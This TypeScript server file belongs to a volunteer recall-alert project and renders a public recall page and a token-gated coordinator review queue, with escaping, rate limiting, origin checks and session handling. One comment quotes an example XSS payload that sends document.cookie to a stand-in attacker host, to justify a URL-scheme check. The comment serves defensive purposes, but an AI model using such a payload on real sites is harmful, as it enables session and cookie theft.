import { createServer as createHttpServer, type IncomingMessage, type ServerResponse } from 'node:http';
import type { Db } from './db.js';
import { rowToRecall } from './ingest.js';
import { decide } from './matchrun.js';
import {
  COOKIE_NAME, RateLimiter, TOKEN_ENV, checkToken, mintSession, originAllowed, parseCookies,
  readToken, sessionCookie, suggestToken, verifySession,
} from './auth.js';

/**
 * Two screens, server-rendered, no client JavaScript.
 *
 *  /        the public page — current high-severity recalls, no signup, no tracking
 *  /review  the queue a coordinator works through
 *
 * The review screen is what makes the precision-over-recall design possible. The matcher sends
 * anything ambiguous to a human rather than to a phone; without a screen, "to a human" means
 * "nowhere", every candidate sits forever, and the coarse watches people rely on quietly do
 * nothing. It is the smallest piece of UI in the project and the one the whole matching policy
 * depends on.
 *
 * Target: fifteen seconds per record. One record at a time, three buttons, no navigation.
 */

function esc(s: string): string {
  return String(s).replace(/[&<>"']/g, (c) =>
    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c]!);
}

/**
 * Escaping is not enough for an href.
 *
 * `esc` neutralises the quotes, so a hostile value cannot break out of the attribute -- but
 * `href="javascript:fetch('//evil.example/'+document.cookie)"` survives escaping intact and
 * runs on this origin the moment a coordinator clicks "official notice". Recall URLs come from
 * an upstream feed and are never scheme-checked on ingest, so the check belongs here.
 *
 * Anything that is not http(s) returns null and the caller renders inert text instead of a link.
 */
export function safeHref(url: string | undefined | null): string | null {
  if (!url) return null;
  try {
    const parsed = new URL(url);
    return parsed.protocol === 'http:' || parsed.protocol === 'https:' ? parsed.href : null;
  } catch {
    return null;
  }
}

const STYLE = `
  :root { color-scheme: light dark }
  body { font: 1.05rem/1.5 system-ui, sans-serif; max-width: 42rem; margin: 0 auto; padding: 1rem 1rem 4rem }
  h1 { font-size: 1.5rem } h2 { font-size: 1.15rem; margin-top: 1.75rem }
  .card { border: 1px solid #bbb; border-left-width: 5px; border-radius: 0 8px 8px 0; padding: .9rem; margin-bottom: 1rem }
  .high { border-left-color: #8c2f1f }
  .why { color: #555; font-size: .95rem }
  form { display: flex; gap: .5rem; flex-wrap: wrap; margin-top: .75rem }
  button { font: inherit; padding: .7rem 1rem; min-height: 44px; border-radius: 8px; border: 2px solid #333; cursor: pointer }
  button.primary { background: #12405c; color: #fff; border-color: #12405c }
  .empty { border: 2px dashed #bbb; border-radius: 8px; padding: 1.5rem; text-align: center }
  .meta { color: #555; font-size: .9rem }
  a { color: #12405c }
`;

function page(title: string, body: string): string {
  return `<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>${esc(title)}</title><style>${STYLE}</style></head><body>${body}</body></html>`;
}

interface QueueRow {
  match_id: number;
  confidence: string;
  reason: string;
  defer_count: number;
  brand: string | null;
  product: string | null;
  upc: string | null;
  category: string | null;
  [k: string]: unknown;
}

export function pendingCount(db: Db): number {
  const r = db.prepare(
    "SELECT COUNT(*) c FROM matches WHERE confidence = 'candidate' AND decision IS NULL",
  ).get() as { c: number };
  return Number(r.c);
}

/** How many of the pending records somebody has already looked at and passed on. */
export function deferredCount(db: Db): number {
  const r = db.prepare(
    "SELECT COUNT(*) c FROM matches WHERE confidence = 'candidate' AND decision IS NULL AND deferred_at IS NOT NULL",
  ).get() as { c: number };
  return Number(r.c);
}

/**
 * The next record to decide. One at a time is the point — a list invites skimming.
 *
 * Note what is NOT selected: `s.phone`. The subscribers table is still joined, because a match
 * belonging to a deleted subscriber must not appear, but the phone number itself never leaves
 * the database for this screen. Pass 2.2 calls fetching a whole row and letting the view hide
 * fields a leak, and it is right: the previous version pulled the phone into a row typed
 * `[k: string]: unknown`, one careless `JSON.stringify(row)` away from publishing it.
 */
export function nextForReview(db: Db): QueueRow | undefined {
  return db.prepare(`
    SELECT m.id AS match_id, m.confidence, m.reason, m.defer_count,
           w.brand, w.product, w.upc, w.category, r.*
    FROM matches m
    JOIN watch_items w ON w.id = m.watch_item_id
    JOIN subscribers s ON s.id = w.subscriber_id
    JOIN recalls r ON r.id = m.recall_id
    WHERE m.confidence = 'candidate' AND m.decision IS NULL
    ORDER BY (m.deferred_at IS NOT NULL), (r.severity = 'high') DESC, r.announced_on DESC, m.id
    LIMIT 1
  `).get() as QueueRow | undefined;
}

export function renderReview(db: Db): string {
  const row = nextForReview(db);
  const remaining = pendingCount(db);

  if (!row) {
    return page(
      'Review queue',
      `<h1>Review queue</h1><div class="empty"><p><strong>Nothing to review.</strong></p>
       <p class="meta">Candidates appear here when the matcher is unsure. An empty queue is the
       normal state.</p></div>`,
    );
  }

  // A record somebody already passed on says so. Otherwise the second coordinator sees an
  // apparently fresh candidate, makes the same "can't tell" call, and it circles forever with
  // nobody aware it is stuck.
  const passed = Number(row.defer_count) > 0
    ? `<p class="meta">Passed over ${row.defer_count === 1 ? 'once' : `${row.defer_count} times`} already —
       if you cannot tell either, it needs someone who can.</p>`
    : '';

  const recall = rowToRecall(row);
  const reason = JSON.parse(row.reason) as { rule: string; detail: string };
  const watched = [
    row.brand && `brand: ${row.brand}`,
    row.product && `product: ${row.product}`,
    row.upc && `UPC: ${row.upc}`,
    row.category && `category: ${row.category}`,
  ].filter(Boolean).join(' · ');

  return page(
    'Review queue',
    `<h1>Review queue <span class="meta">(${remaining} waiting)</span></h1>

     <div class="card ${recall.severity === 'high' ? 'high' : ''}">
       <p><strong>${esc(recall.title)}</strong></p>
       <p>${esc(recall.hazard)}</p>
       <p class="meta">${esc(recall.source.toUpperCase())} ${esc(recall.sourceRef)} ·
          announced ${esc(recall.announcedOn)} · severity ${esc(recall.severity)}</p>
       ${recall.codeInfo ? `<p class="meta">Codes: ${esc(recall.codeInfo)}</p>` : ''}
     </div>

     <h2>What they said they have</h2>
     <p>${esc(watched || '(nothing recorded)')}</p>

     <h2>Why it was flagged</h2>
     <p class="why">${esc(reason.detail)}<br><span class="meta">rule: ${esc(reason.rule)}</span></p>

     ${passed}

     <form method="post" action="/review/${row.match_id}">
       <button class="primary" name="decision" value="alert">Send the alert</button>
       <button name="decision" value="not_a_match">Not a match</button>
       <button name="decision" value="unclear">Can't tell — skip</button>
     </form>

     <p class="meta">Deciding "send" queues one text. Deciding "not a match" is a bug report about
     the matcher — those get read. "Can't tell" puts it back at the end of the queue for somebody
     else; it is not a way of clearing it.</p>`,
  );
}

export function renderPublic(db: Db): string {
  const rows = db.prepare(`
    SELECT * FROM recalls WHERE severity = 'high' ORDER BY announced_on DESC LIMIT 25
  `).all() as Record<string, unknown>[];

  const cards = rows.length
    ? rows.map((r) => {
        const rec = rowToRecall(r);
        const href = safeHref(rec.url);
        return `<div class="card high">
          <p><strong>${esc(rec.title)}</strong></p>
          <p>${esc(rec.hazard)}</p>
          <p><strong>What to do:</strong> ${esc(rec.remedy || 'See the official notice.')}</p>
          <p class="meta">${esc(rec.source.toUpperCase())} · announced ${esc(rec.announcedOn)}
            ${href ? `· <a href="${esc(href)}" rel="noopener noreferrer">official notice</a>` : ''}</p>
        </div>`;
      }).join('')
    : '<div class="empty"><p>No current high-severity recalls on file.</p></div>';

  return page(
    'Current recalls',
    `<h1>Current recalls</h1>
     <p>Serious food, drug, and vehicle recalls. No signup, nothing recorded about you.</p>
     ${cards}
     <p class="meta">Always confirm against the official notice before acting. This page is an
     independent volunteer project.</p>`,
  );
}

/** Bodies here are three short form fields. Anything larger is not a form. */
const MAX_BODY_BYTES = 8 * 1024;

async function readBody(req: IncomingMessage): Promise<string> {
  const chunks: Buffer[] = [];
  let size = 0;
  for await (const c of req) {
    size += (c as Buffer).length;
    if (size > MAX_BODY_BYTES) throw new Error('body too large');
    chunks.push(c as Buffer);
  }
  return Buffer.concat(chunks).toString('utf8');
}

function renderSignIn(message?: string): string {
  return page(
    'Sign in',
    `<h1>Review queue</h1>
     ${message ? `<div class="card"><p><strong>${esc(message)}</strong></p></div>` : ''}
     <p>This screen decides whether a real person gets a text message. It needs the reviewer
     token.</p>
     <form method="post" action="/review/sign-in">
       <label for="token">Reviewer token</label>
       <input id="token" name="token" type="password" autocomplete="current-password"
              style="font:inherit;padding:.7rem;min-height:44px;border-radius:8px;border:2px solid #333;flex:1 1 16rem">
       <button class="primary" type="submit">Sign in</button>
     </form>`,
  );
}

function renderNotConfigured(problem?: string): string {
  return page(
    'Review queue unavailable',
    `<h1>Review queue unavailable</h1>
     <div class="card high">
       <p><strong>No reviewer token is set, so this screen will not open.</strong></p>
       <p>${esc(problem ?? `Set ${TOKEN_ENV} and restart.`)}</p>
     </div>
     <p class="meta">This screen sends text messages to people and dismisses recall alerts.
     Serving it without a credential would let anyone who can reach this port do both, so an
     unconfigured deployment refuses rather than opening.</p>
     <p class="meta">Suggested token: <code>${esc(suggestToken())}</code></p>`,
  );
}

/**
 * One shared limiter for the whole process, keyed by client address.
 *
 * Thirty decisions a minute is roughly four times the fifteen-second target a human works at, so
 * a coordinator will never see it; a script walking IDs hits it almost immediately.
 */
const DECISION_LIMIT = 30;
const SIGN_IN_LIMIT = 10;
const WINDOW_MS = 60_000;

export interface ServerOptions {
  reviewer?: string;
  env?: Record<string, string | undefined>;
  /** Set when the deployment terminates TLS, so the session cookie is marked Secure. */
  secureCookies?: boolean;
  now?: () => number;
}

export function createServer(db: Db, reviewerOrOpts: string | ServerOptions = {}) {
  const opts: ServerOptions =
    typeof reviewerOrOpts === 'string' ? { reviewer: reviewerOrOpts } : reviewerOrOpts;
  const reviewer = opts.reviewer ?? 'coordinator';
  const tokenState = readToken(opts.env ?? process.env);
  const now = opts.now ?? Date.now;
  const decisions = new RateLimiter(DECISION_LIMIT, WINDOW_MS);
  const signIns = new RateLimiter(SIGN_IN_LIMIT, WINDOW_MS);

  return createHttpServer((req: IncomingMessage, res: ServerResponse) => {
    void (async () => {
      const url = new URL(req.url ?? '/', 'http://localhost');
      const html = (status: number, body: string, headers: Record<string, string> = {}) => {
        res.writeHead(status, { 'content-type': 'text/html; charset=utf-8', ...headers });
        res.end(body);
      };
      const client = req.socket.remoteAddress ?? 'unknown';
      const isReview = url.pathname === '/review' || url.pathname.startsWith('/review/');

      // Everything under /review is gated. The public page below is not.
      if (isReview) {
        if (!tokenState.configured) {
          html(503, renderNotConfigured(tokenState.problem));
          return;
        }

        if (req.method === 'POST' && url.pathname === '/review/sign-in') {
          if (!signIns.take(client, now())) {
            html(429, renderSignIn('Too many attempts. Wait a minute.'), {
              'retry-after': String(signIns.retryAfterSeconds(client, now())),
            });
            return;
          }
          const supplied = new URLSearchParams(await readBody(req)).get('token') ?? '';
          if (!checkToken(supplied, tokenState)) {
            html(401, renderSignIn('That token was not right.'));
            return;
          }
          res.writeHead(303, {
            location: '/review',
            'set-cookie': sessionCookie(mintSession(tokenState.token!, now()), opts.secureCookies ?? false),
          });
          res.end();
          return;
        }

        const cookies = parseCookies(req.headers.cookie);
        if (!verifySession(cookies[COOKIE_NAME], tokenState, now())) {
          html(req.method === 'POST' ? 401 : 200, renderSignIn());
          return;
        }
      }

      if (req.method === 'POST') {
        const m = /^\/review\/(\d+)$/.exec(url.pathname);
        if (m) {
          if (!originAllowed({
            origin: req.headers.origin as string | undefined,
            referer: req.headers.referer,
            host: req.headers.host,
          })) {
            html(403, page('Rejected', '<h1>Rejected</h1><p>That request came from another site.</p>'));
            return;
          }
          if (!decisions.take(client, now())) {
            html(429, page('Slow down', '<h1>Slow down</h1><p>Too many decisions too quickly.</p>'), {
              'retry-after': String(decisions.retryAfterSeconds(client, now())),
            });
            return;
          }
          const params = new URLSearchParams(await readBody(req));
          const choice = params.get('decision');
          if (choice === 'alert' || choice === 'not_a_match' || choice === 'unclear') {
            decide(db, Number(m[1]), choice, reviewer);
          }
          // Redirect after post so a refresh cannot re-decide the same record.
          res.writeHead(303, { location: '/review' });
          res.end();
          return;
        }
      }

      if (url.pathname === '/review') {
        html(200, renderReview(db));
        return;
      }
      if (url.pathname === '/') {
        html(200, renderPublic(db));
        return;
      }

      res.writeHead(404, { 'content-type': 'text/plain' });
      res.end('not found');
    })().catch(() => {
      if (res.headersSent) { res.end(); return; }
      res.writeHead(500, { 'content-type': 'text/plain' });
      res.end('error');
    });
  });
}
